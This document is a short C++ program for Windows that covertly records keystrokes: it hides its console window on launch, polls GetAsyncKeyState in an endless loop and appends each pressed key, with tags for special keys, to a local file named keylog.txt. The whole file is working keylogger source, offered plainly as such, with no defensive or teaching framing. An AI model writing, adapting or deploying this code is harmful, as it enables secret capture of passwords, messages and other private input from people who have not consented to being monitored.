//This program records the keystrokes in a text file  

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <fstream>
#include <iostream>
using namespace std;


void LOG(string keystroke)
{
  fstream logFile;
  logFile.open("keylog.txt", fstream::app);
  if(logFile.is_open())
  {
    logFile << keystroke;
    logFile.close();
  }
}


bool SpecialKeys(int S_key)
{
	switch (S_key) 
	{
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case VK_OEM_PERIOD:
		cout << ".";
		LOG(".");
		return true;
	case VK_OEM_COMMA:
		cout << ",";
		LOG(",");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LOCK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_ESCAPE:
		cout << "#ESCAPE";
		LOG("#ESCAPE");
		return true;
	default: 
		return false;
	}
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char key = 'a';

	while (true)
  	{
		for (int key = 8; key <= 100; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
      			{
				if (SpecialKeys(key) == false)
        			{
					fstream logFile;
					logFile.open("keylog.txt", fstream::app);
					if (logFile.is_open())
          				{
						logFile << char(key);
						logFile.close();
					}

				}
			}
		}
	}

	return 0;
}
